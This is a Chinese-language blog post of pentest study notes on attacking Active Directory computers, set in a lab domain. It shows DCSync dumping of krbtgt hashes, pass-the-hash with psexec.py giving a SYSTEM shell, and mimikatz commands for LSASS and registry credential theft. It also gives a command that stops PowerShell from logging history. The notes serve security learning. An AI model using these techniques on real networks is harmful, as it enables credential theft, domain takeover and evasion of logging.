---
layout: article
title: Computers--AD from 0 to 0.9 part 2
mathjax: true
key: a00006	
cover: /bkgs/3.jpg
modify_date: 2021-10-4
show_author_profile: true
excerpt_type: html
tag: 
- DC
- Pentest
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是AD from 0 to 0.9系列笔记的第二部分，主要是计算机相关<!--more-->

原文： [Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/#why-this-post) 

# **Computers**：

计算机是AD核心部分，一般有三种计算机：

| DC     | 管理域的核心服务器，是win服务器          |
| ------ | ---------------------------------------- |
| 工作站 | 个人电脑，win10、win7                    |
| 服务器 | 提供网站文件数据库服务，Linux或win服务器 |

# **Domain Controllers**

域的中心服务器DC，运行 [Active Directory Domain Service](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview) (AD DS)服务

数据库文件在DC的C:\Windows\NTDS\ntds.dit，因此对改文件和DC的访问需限制在管理员中

DC需要能和其他电脑通信，考虑到负载均衡一个域一般会有多个DC，DC间也需要同步

为了允许计算机和用户获取数据库数据，DC提供了一系列服务如DNS, Kerberos, LDAP, SMB, RPC, etc.

## **Domain Controllers discovery**

找DC不难，比如发起DNS请求域的LDAP服务器（即DC），不需要权限

如：nslookup -q=srv _ldap._tcp.dc._msdcs.contoso.local

```powershell
PS C:\Users\Anakin> nslookup -q=srv _ldap._tcp.dc._msdcs.contoso.local
Server:  UnKnown
Address:  192.168.100.2

_ldap._tcp.dc._msdcs.contoso.local      SRV service location:
          priority       = 0
          weight         = 100
          port           = 389
          svr hostname   = dc01.contoso.local
_ldap._tcp.dc._msdcs.contoso.local      SRV service location:
          priority       = 0
          weight         = 100
          port           = 389
          svr hostname   = dc02.contoso.local
dc01.contoso.local      internet address = 192.168.100.2
dc02.contoso.local      internet address = 192.168.100.3
```

系统工具也行，如nltest ，但需要有一个用户

nltest /dclist:contoso.local

```powershell
PS C:\Users\Anakin> nltest /dclist:contoso.local
Get list of DCs in domain 'contoso.local' from '\\dc01.contoso.local'.
    dc01.contoso.local [PDC]  [DS] Site: Default-First-Site-Name
    dc02.contoso.local        [DS] Site: Default-First-Site-Name
The command completed successfully
```

或者扫端口来判断

```text
$ nmap 192.168.100.2 -Pn -sV -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 11:17 CEST
Nmap scan report for 192.168.100.2
Host is up (0.00068s latency).
Not shown: 65509 filtered ports
PORT      STATE SERVICE       VERSION
42/tcp    open  tcpwrapped
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-04 09:19:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 164.31 seconds
```

| 42          | [WINS](https://zer1t0.gitlab.io/posts/attacking_ad/#netbios-name-service) | 将NetBIOS名称解析为IP地址的中心化服务           |
| ----------- | ------------------------------------------------------------ | ----------------------------------------------- |
| 53          | [DNS](https://zer1t0.gitlab.io/posts/attacking_ad/#dns)      | dns名字转换为ip地址的服务                       |
| 88          | [Kerberos](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos) | 给用户提供 Kerberos服务                         |
| 135         | [RPC](https://zer1t0.gitlab.io/posts/attacking_ad/#rpc)端点映射器   (Remote Procedure Call) | 为不同的RPC服务找RPC端点                        |
| 139         | [NetBIOS](https://zer1t0.gitlab.io/posts/attacking_ad/#netbios) Session 服务 | win电脑用来替代TCP的老服务，允许像SMB或RPC      |
| 389         | [LDAP](https://zer1t0.gitlab.io/posts/attacking_ad/#ldap)  (Lightweight  Directory Access Protocol) | 查询/修改域数据库                               |
| 445         | [SMB](https://zer1t0.gitlab.io/posts/attacking_ad/#smb)  (Server  Message Block) | 计算机间分享文件，还允许通过命名管道进行RPC调用 |
| 464         | [kpasswd](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos) | Kerberos 的用来改变用户密码的服务               |
| 593         | [RPC](https://zer1t0.gitlab.io/posts/attacking_ad/#rpc) over HTTP Endpoint  Mapper |                                                 |
| 636         | [LDAPS](https://zer1t0.gitlab.io/posts/attacking_ad/#ldap)   | LDAP with  SSL                                  |
| 3268        | [LDAP](https://zer1t0.gitlab.io/posts/attacking_ad/#ldap) [Global   Catalog](https://zer1t0.gitlab.io/posts/attacking_ad/#global-catalog) | 查询全局目录的服务                              |
| 3269        | [LDAPS](https://zer1t0.gitlab.io/posts/attacking_ad/#ldap) [Global   Catalog](https://zer1t0.gitlab.io/posts/attacking_ad/#global-catalog) |                                                 |
| 5985        | [WinRM](https://zer1t0.gitlab.io/posts/attacking_ad/#winrm)  | 使用CIM对象或Powershell远程处理管理计算机的服务 |
| 9389        | [ADWS](https://zer1t0.gitlab.io/posts/attacking_ad/#adws)    | 用来查询/修改域数据库的web服务                  |
| 49152-65535 | RPC端点                                                      | 不同RPC服务/接口侦听客户端的随机RPC端口。       |

3389也有可能开着的,允许 [RDP](https://zer1t0.gitlab.io/posts/attacking_ad/#rdp)或者[many other services](https://docs.microsoft.com/en-US/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements).

## **Domain database dumping**

万一拿到域管理员想找 krbtgt 伪造[Golden tickets](https://en.hackndo.com/kerberos-silver-golden-tickets/).之类的。

用 [ntdsutil](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)) or [vssadmin ](https://docs.microsoft.com/en-gb/windows-server/administration/windows-commands/vssadmin)脱 [the NTDS.dit ](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration#no-credentials-ntdsutil)文件，或者用 [mimikatz lsadump::dsync](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#dcsync)命令或 [impacket secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)脚本远程[dcsync ](https://adsecurity.org/?p=1729)攻击

DCSync攻击时要注意，如果在大的域中请求所有凭证DC会崩内存

```bash
###DCSync attack with secretsdump to retrieve krbtgt credentials
$ secretsdump.py 'contoso.local/Administrator@192.168.100.2' -just-dc-user krbtgt
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fe8b03404a4975e7226caf6162cfccba:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162
krbtgt:aes128-cts-hmac-sha1-96:a268f61e103134bb7e975a146ed1f506
krbtgt:des-cbc-md5:0e6d79d66b4951cd
[*] Cleaning up...
```

# **Windows computers**

## **Windows computers discovery**

首先，万一有凭证，用[LDAP](https://zer1t0.gitlab.io/posts/attacking_ad/#ldap)  [query the domain database](https://zer1t0.gitlab.io/posts/attacking_ad/#how-to-query-the-database)，能查计算机名字甚至系统

```powershell
~$ ldapsearch -H ldap://192.168.100.2 -x -LLL -W -D "anakin@contoso.local" -b "dc=contoso,dc=local" "(objectclass=computer)" "DNSHostName" "OperatingSystem"
Enter LDAP Password: 
dn: CN=DC01,OU=Domain Controllers,DC=contoso,DC=local
operatingSystem: Windows Server 2019 Standard Evaluation
dNSHostName: dc01.contoso.local

dn: CN=WS01-10,CN=Computers,DC=contoso,DC=local
operatingSystem: Windows 10 Enterprise
dNSHostName: ws01-10.contoso.local

dn: CN=WS02-7,CN=Computers,DC=contoso,DC=local
operatingSystem: Windows 7 Professional
dNSHostName: WS02-7.contoso.local

dn: CN=SRV01,CN=Computers,DC=contoso,DC=local
operatingSystem: Windows Server 2019 Standard Evaluation
dNSHostName: srv01.contoso.local
```

**没凭证的话**，扫描，win电脑有几个默认打开的端口而且在域环境中一般不会被防火墙保护

| 137（[NetBIOS   name service](https://zer1t0.gitlab.io/posts/attacking_ad/#netbios-name-service)） | [nbtscan](http://www.unixwiz.net/tools/nbtscan.html) or nmap [nbtstat](https://nmap.org/nsedoc/scripts/nbstat.html) script 来扫 |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| 445  （[SMB](https://zer1t0.gitlab.io/posts/attacking_ad/#smb)） | [ntlm-info](https://github.com/Zer1t0/ntlm-info) or nmap [smb-os-discovery](https://nmap.org/nsedoc/scripts/smb-os-discovery.html) script. |
| 135（[RCP](https://zer1t0.gitlab.io/posts/attacking_ad/#rcp)）、139  ([NetBIOS session service](https://zer1t0.gitlab.io/posts/attacking_ad/#netbios-session-service)) | nmap                                                         |

```powershell
###NetBIOS scan
$ nbtscan 192.168.100.0/24
192.168.100.2   CONTOSO\DC01                    SHARING DC
192.168.100.7   CONTOSO\WS02-7                  SHARING
192.168.100.10  CONTOSO\WS01-10                 SHARING
*timeout (normal end of scan)
```

```powershell
###SMB scan
$ ntlm-info smb 192.168.100.0/24

Target: 192.168.100.2
NbComputer: DC01
NbDomain: CONTOSO
DnsComputer: dc01.contoso.local
DnsDomain: contoso.local
DnsTree: contoso.local
Version: 10.0.17763
OS: Windows 10 | Windows Server 2019 | Windows Server 2016

Target: 192.168.100.7
NbComputer: WS02-7
NbDomain: CONTOSO
DnsComputer: ws02-7.contoso.local
DnsDomain: contoso.local
Version: 6.1.7601
OS: Windows 7 | Windows Server 2008 R2

Target: 192.168.100.10
NbComputer: WS01-10
NbDomain: CONTOSO
DnsComputer: ws01-10.contoso.local
DnsDomain: contoso.local
DnsTree: contoso.local
Version: 10.0.19041
OS: Windows 10 | Windows Server 2019 | Windows Server 2016
```

## **Windows computers connection**

找到win机器过后就需要连接到它们来抓凭证或数据

这通常需要远程执行命令

### **Connecting with RPC/SMB**

最常见的应该是把RPC和SMB混着用， [PsExec ](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)**或者**impacket 示例： [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py), [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)**以及其他*****exec.py**

这些工具通常用RPC执行命令，SMB管道来收发。

执行命令通常只需要445（SMB）开着，类似[wmiexec.py ](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)需要135(RPC over TCP)开着

用NT or LM哈希也能实施Pass-The-Hash，impacket tools有一个参数直接使用NT or LM哈希，为了和PsExec一起使用，需要用minikatz在window session中注入NT哈希（ [inject the NT hash in the Windows session with mimikatz](https://stealthbits.com/blog/passing-the-hash-with-mimikatz/).）

```powershell
### psexec.py with a NT hash
$ psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 192.168.100.10.....
[*] Found writable share ADMIN$
[*] Uploading file WFKqIQpM.exe
[*] Opening SVCManager on 192.168.100.10.....
[*] Creating service AoRl on 192.168.100.10.....
[*] Starting service AoRl.....
[!] Press help for extra shell commands
The system cannot find message text for message number 0x2350 in the message file for Application.

(c) Microsoft Corporation. All rights reserved.
b'Not enough memory resources are available to process this command.\r\n'
C:\Windows\system32>whoami
nt authority\system
```

这样的话你就在用[NTLM](https://zer1t0.gitlab.io/posts/attacking_ad/#ntlm)作为认证机制，这在[Kerberos](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos)被默认使用的AD中并不是最好的选择

要用Kerberos 的话你需要在这些工具中提供Kerberos 票据，如果用Impacket， [set a ccache file to being used by impacket](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#using-ticket-in-linux) （ccache（compiler cache）），在windows里的话需要用 [mimikatz](https://github.com/gentilkiwi/mimikatz) or [Rubeus](https://github.com/GhostPack/Rubeus)来 [inject the ticket in the session](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#using-ticket-in-windows)

（ **Impacket**是用于处理网络协议的Python类的集合）

为了拿到Kerberos 票据来使用，可以用用户密码请求一个；NT hash (Overpass-the-Hash) or the Kerberos keys (Pass-The-Key) ；或者在 [Windows](https://zer1t0.gitlab.io/posts/attacking_ad/#lsass-credentials) or [Linux](https://zer1t0.gitlab.io/posts/attacking_ad/#linux-kerberos-tickets) 偷一个 (Pass-The-Ticket)

[ticket_converter](https://github.com/Zer1t0/ticket_converter) or [cerbero ](https://github.com/Zer1t0/cerbero#convert)可以转化win和linux的票据文件格式

```powershell
###psexec.py with Kerberos authentication

$ getTGT.py contoso.local/Anakin -dc-ip 192.168.100.2 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Saving ticket in Anakin.ccache
$ export KRB5CCNAME=$(pwd)/Anakin.ccache
$ psexec.py contoso.local/Anakin@WS01-10 -target-ip 192.168.100.10 -k -no-pass
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 192.168.100.10.....
[*] Found writable share ADMIN$
[*] Uploading file TwIEeeqd.exe
[*] Opening SVCManager on 192.168.100.10.....
[*] Creating service ZQZb on 192.168.100.10.....
[*] Starting service ZQZb.....
[!] Press help for extra shell commands
The system cannot find message text for message number 0x2350 in the message file for Application.

(c) Microsoft Corporation. All rights reserved.
b'Not enough memory resources are available to process this command.\r\n'
C:\Windows\system32>
```

使用Kerberos身份验证时，需要将远程计算机的主机名（DNS名称或NetBIOS名称）而不是其IP作为目标传递给工具，这是因为Kerberos身份验证使用主机名来标识远程计算机的[service](https://zer1t0.gitlab.io/posts/attacking_ad/#services)，并提供正确的票证对其进行身份验证

### Connecting with Powershell Remoting

[Powershell Remoting](https://zer1t0.gitlab.io/posts/attacking_ad/#powershell-remoting) 可以替代RPC/SMB来连接win机器，端口5985，在win服务器上**默认开启**

win上可以用许多[CmdLets ](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.1)和参数，linux可以用[evil-winrm](https://github.com/Hackplayers/evil-winrm).

| RPC/SMB             | 密码，NT  hash 或Kerberos 票据连机器。                       |
| ------------------- | ------------------------------------------------------------ |
| evil-winrm          | 可以传参或者像impacket一样配置到ccache文件里                 |
| Powershell  cmdlets | 直接用密码，但如果是NT hash 或Kerberos 票据，需要用 [Rubeus](https://github.com/GhostPack/Rubeus) or [mimikatz ](https://github.com/gentilkiwi/mimikatz)来将这些注入 |

### **Connecting with RDP**

 [RDP](https://zer1t0.gitlab.io/posts/attacking_ad/#rdp) (Remote Desktop Protocol)，win连接用 [mstsc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)

LINUX用 [rdesktop](http://www.rdesktop.org/), [freerdp](https://www.freerdp.com/) or [remmina](https://remmina.org/)

与RPC/SMB and Powershell Remoting 不同，RDP明文传输密码来缓存凭证以及实施SSO，就像物理登陆一样。因此RDP就需要用密码并且不能实施 Pass-The-Hash，默认的话（？）。

RDP连接时 [the credentials are cached in the target machine](https://zer1t0.gitlab.io/posts/attacking_ad/#remoteinteractive-logon)，容易被像mimikatz的工具从lsass.exe服务窃取。存凭证是为了网络连接时复用，但有时没必要，因此[Windows 8.1 / 2012 R2 Microsoft introduced the Restricted Admin mode for RPD](https://docs.microsoft.com/en-us/archive/blogs/kfalde/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2)，限制管理模式开启时就不会发送明文凭证了，因此可以实施Pass-The-Hash/Key/Ticket 来建立RDP连接

Linux的话可以用freedp实施[Pass-The-Hash with RDP](https://www.kali.org/blog/passing-hash-remote-desktop/)（需要装freerdp2-x11 freerdp2-shadow-x11），只需要提供NT hash，不用密码

win的话用[ mimikatz or Rubeus](https://shellz.club/pass-the-hash-with-rdp-in-2019/)注入NT hash 或 Kerberos票据，然后在用[mstsc.exe /restrictedadmin ](https://shellz.club/pass-the-hash-with-rdp-in-2019/)建立不需要用户密码的RDP连接

![1](/pics/AD_0_TO_0.9/1.png)

## **Windows computers credentials**

### **LSASS credentials**

win机器上一般找凭证的地方是**LSASS** (Local Security Authority Subsystem Service) process (lsass.exe)。LSASS管计算机上安全相关的操作，包括用户认证。

用户使用 [interactive logon](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/windows-logon-scenarios#BKMK_InteractiveLogon)，物理登陆或通过 [RDP](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)?redirectedfrom=MSDN#remote-desktop-users)时，用户凭证缓存在LSASS进程，以此来在需要[network logon](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/windows-logon-scenarios#BKMK_NetworkLogon)到域内其他计算机时用SSO登陆。

**（通过**NTLM or Kerberos认证时不会缓存凭证到电脑，除非Kerberos delegation开启**）**



这些凭证由被LSASS使用的 [SSPs](https://zer1t0.gitlab.io/posts/attacking_ad/#windows-ssps) (Security Support Providers)所缓存，以此来提供不同的认证方法，SSPs例如：

| [Kerberos   SSP](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos-ssp) | 管理Kerberos认证并为当前已登陆用户负责恢复票据和Kerberos密钥 |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| [NTLMSSP](https://zer1t0.gitlab.io/posts/attacking_ad/#ntlm-ssp) or MSV SSP | 解决NTLM认证并负责为已登录用户存储NTLM哈希                   |
| [Digest SSP](https://zer1t0.gitlab.io/posts/attacking_ad/#digest-ssp) | 应用Digest Access protocol，被HTTP应用，存的是用户明文密码来计算摘要 |

即使密码缓存在Windows 2008 R2默认关闭，还是可以设置注册表里面HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential 为1或者在内存直接[patching the Digest SSP](https://blog.xpnsec.com/exploring-mimikatz-part-1/)



因此，如果能获取LSASS 进程内存（需要**SeDebugPrivilege**），就能拿到缓存凭证,包括NT hash，kerberos密钥和票据，在老机器或者配置错误的机器上可能还有明文密码

 

从LSASS获取凭证常用的手段是借助mimikatz，在目标机器中启动minikatz，或者用像[procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [comsvcs.dll](https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/) or [werfault.exe](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)的工具脱[LSASS memory](https://www.deepinstinct.com/2021/01/24/lsass-memory-dumps-are-stealthier-than-ever-before/)，然后用minikatz或 [pypikatz](https://github.com/skelsec/pypykatz)处理dump。也可以用[lsassy](https://github.com/Hackndo/lsassy) 来远程读dump来避免下载很多m内容

要用mimikatz提取凭证，你需要知道一些命令来提取secrets

| sekurlsa::logonpasswords | 提取NT hash和密码            |
| ------------------------ | ---------------------------- |
| sekurlsa::ekeys          | 拿kerberos密钥               |
| sekurlsa::tickets        | 取回存在机器上的kerberos票据 |

具体来说你需要 [SeDebugPrivilege](https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113)来获取LSASS进程内存（允许用户debug其他用户的进程，可以注入系统进程来提权等等），通常只有管理员有权限。

并且，dump the LSASS memory的时候必须**保持开启SeDebugPrivilege** ，Powershell 中默认开启但CMD中默认关闭，但可以在mimikatz用 privilege::debug 开启，或者用powershell打开进程  powershell.exe <command>，或用[sepriv](https://github.com/Zer1t0/sepriv)之类的工具在cmd中启用它

 

但LSASS可以防止凭据提取，比如用 [Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-how-it-works)，它用了hypervisor 来安全存放系统凭证（[Credential Guard can be bypassed](https://teamhydra.blog/2020/08/25/bypassing-credential-guard/)）

lsass.exe可配置运行为PPL (Protected Process Light)，这就很难获取配置但 [can be disabled](https://www.redcursor.com.au/blog/bypassing-lsa-protection-aka-protected-process-light-without-mimikatz-on-windows-10).

### **Registry credentials**

#### **LSA secrets**

注册表也能找到凭证，比如[LSA secrets](https://passcape.com/index.php?section=docsys&cmd=details&id=23)，存一些只有SYSTEM 账户能访问的数据，存为SECURITY [hive](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) file，并用BootKey/SysKey加密（储存在SYSTEM hive file）

LSA secrets能找到：

| **Domain Computer Account** | 计算机账密存储在LSA secrets，密码默认30天换一次（[Password Updates ](https://adsecurity.org/?p=280)）；这个账户被本地账户SYSTEM 使用来与域交互而不是本地，因此这个账户在本机器上没有管理员权限  <br>但即便计算机域账户没有管理员权限，还是能创建[Silver ticket](https://zer1t0.gitlab.io/posts/attacking_ad/#golden-silver-ticket) or perform a [RBCD attack](https://zer1t0.gitlab.io/posts/attacking_ad/#s4u-attacks)来以管理员身份访问计算机 |
| --------------------------- | ------------------------------------------------------------ |
| **Service users passwords** | 为了代表用户运行服务，计算机需要存储其密码。但是，不会存储密码的用户，而是存储服务名称，因此您可能需要调查用户名是什么。 |
| **Auto-logon password**     | [auto-logon](https://keithga.wordpress.com/2013/12/19/sysinternals-autologon-and-securely-encrypting-passwords/)开启的话，密码就会存在LSA secrets里面，或者 存在注册表的key DefaulUserName下的 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon 。域和用户名一直分别存在DefaultDomainName 和 DefaultUserName |
| **DPAPI master keys**       | [data   protection API](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) (DPAPI) 加密数据而不用担心加密密钥，拿到master keys就能[decrypt   users data](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords) |

SECURITY hive file（安全配置单元文件）也会存上一个域用户登陆的凭证，叫Domain cached credentials (DCC)，即便连不上DC也能认证用户；这些缓存的凭证为MSCACHEV2/MSCASH hashes，不能实施PTH，但能[crack them](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials)来取得用户密码

#### **SAM**

[SAM](https://en.wikipedia.org/wiki/Security_Account_Manager) hive file也有凭证，包括本地用户的NT hash，可以尝试撞库

#### **Dumping registry credentials**

可以用mimikatz从内存读SECURITY and SAM hives的凭证

先 token::elevate 拿SYSTEM session才能读凭证，再privilege::debug（如果需要开SeDebugPrivilege的话）

然后就可以拿凭证了：

| lsadump::secrets | LSA secrets               |
| ---------------- | ------------------------- |
| lsadump::cache   | cached  domain logons     |
| lsadump::sam     | local account credentials |

或，用 [reg save](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save)命令存到本地，然后 [impacket secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)脚本或mimikatz拿内容

先dump注册表hives，需要SECURITY and SAM hive files，因为它们包含允许解密SECURITY and SAM hives的system Boot Key (or System Key) ，hives保存到本地后跑secretsdump来dump，例子：

```powershell
$ secretsdump.py -system system.bin -security security.bin -sam sam.bin  LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xb471eae0e93128b9c8d5780c19ac9f1d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6535b87abdb112a8fc3bf92528ac01f6:::
user:1001:aad3b435b51404eeaad3b435b51404ee:57d583aa46d571502aad4bb7aea09c70:::
[*] Dumping cached domain logon information (domain/username:hash)
CONTOSO.LOCAL/anakin:$DCC2$10240#anakin#2933cad9235d2f502d7bedc2016e6553
CONTOSO.LOCAL/han:$DCC2$10240#han#4a52a6d0d7f3590c68124f4d5f7ef285
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:59aa6b91e74a0a6fc40efee9f2fb07936a9d69f46397dee82d3ec6ca4d0c01a0293d79e5c040bf564b7938d6c25597816921ec614ad25933af6a2482a8ace4d1dd54dd4bb465384b30046d85f65083e885455ec5f01dcae30df619e3f944eaa008a09e0f7432981f7cdb8dea34e432f00ed92e1ae3e48111326deb2d0f9a6e7d868e24c840b8814d338a4165f90381a4a6b824addb4f71c5908cac4423a4efbc5a4d846c09245930b526a6bec8c678ca838a005dcf5014f8b18426c3e0dbd3921f82c57e6ca025d0258d4536a9e0b68b90ff26c054c992c84d11e95f78c55ca411ee0e5b412cb4fc0f08c28ca2d79996
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b13dae64def5f205f382a0ab4174eb85
[*] DefaultPassword 
(Unknown User):user
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6880eb76862df7875705885938102c696717eb18
dpapi_userkey:0x828326418633117212de44bcda10806fc6765d4a
[*] NL$KM 
 0000   0B BC 2E DB A1 A7 E2 42  56 6D B8 4B 5A 37 79 A4   .......BVm.KZ7y.
 0010   53 51 75 6D 64 7F 9A BF  DC BF C2 83 F4 64 02 A6   SQumd........d..
 0020   5E E8 53 AB E5 4B 35 A4  5B 19 7E 97 E0 CA 32 6C   ^.S..K5.[.~...2l
 0030   77 68 E8 F1 C0 54 AD 7B  03 F7 BE 59 2E 59 C3 93   wh...T.{...Y.Y..
NL$KM:0bbc2edba1a7e242566db84b5a3779a45351756d647f9abfdcbfc283f46402a65ee853abe54b35a45b197e97e0ca326c7768e8f1c054ad7b03f7be592e59c393
[*] _SC_mysql 
(Unknown User):Solo1234!
[*] Cleaning up...
```

| Dumping  cached domain logon information | 有域缓存凭证，to [crack them](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials)，以$DCC2$10240#username#hash的形式保存然后就可以使用 [hashcat](https://hashcat.net/)了 |
| ---------------------------------------- | ------------------------------------------------------------ |
| $MACHINE.ACC                             | 有十六进制编码的计算机账户密码，以及NT hash                  |
| DefaultPassword                          | 有自动登录密码。为了拿到域和用户名，需要检查HKLM\SOFTWARE\Microsoft\Windows  NT\CurrentVersion\Winlogon registry key里的DefaultDomainName and DefaultUserName |
| DPAPI_SYSTEM                             | 系统的master DPAPI keys，可以[decrypt the   user files](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords) |
| NK$LM                                    | 给的是[key used to encrypt the Domain Cached Credentials](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/dumping-lsa-secrets-on-nt5-x64/)，不过secretsdump 已经解密了，用处不大 |
| _SC_<service>                            | 运行服务的用户密码                                           |

### **Powershell history**

```
#阅读powershell history 来找凭证
#Get the Powershell history path of the current users.
(Get-PSReadlineOption).HistorySavePath

#Check the Powershell history of all users
Get-ChildItem+path
```

```
#避免执行的命令被记录在powershell
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

### **Other places to find credentials in Windows**

还能找找脚本或者配置文件，像浏览器就就会存凭证， [LaZagne project](https://github.com/AlessandroZ/LaZagne)有软件列表

 [keyloggers](https://www.tarlogic.com/en/blog/how-to-create-keylogger-in-powershell/) or fake [SSP modules ](https://adsecurity.org/?p=1760)这些工具也可以找凭证

# **Linux computers**

## **Linux computers discovery**

如果有域凭证可以和win一样用LDAP查询域数据库

linux没那么多端口默认开着，因此一般就是ssh

## **Linux computers connection**

最常用的方式就是ssh拿shell，[Powershell remoting](https://zer1t0.gitlab.io/posts/attacking_ad/#powershell-remoting)也可以用在Linux上

除了账密也可以用SSH key [grab from another machine](https://zer1t0.gitlab.io/posts/attacking_ad/#ssh-keys)

如果linux计算机是域的一部分，你可以用ssh 来使用 [Kerberos authentication](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)；

可以通过允许GSSAPI 认证(-o GSSAPIAuthentication=yes)来指定ssh 服务端用Kerberos认证。

可以偷（Pass-The-Ticket）,带NT hash请求 (Overpass-The-Hash) 或 Kerberos key (Pass-The-Key)的方式来拿到ticket。

可以用[Rubeus](https://github.com/GhostPack/Rubeus), [cerbero](https://github.com/Zer1t0/cerbero) or [impacket](https://github.com/SecureAuthCorp/impacket) 带着NT hash或Kerberos keys请求Kerberos票据

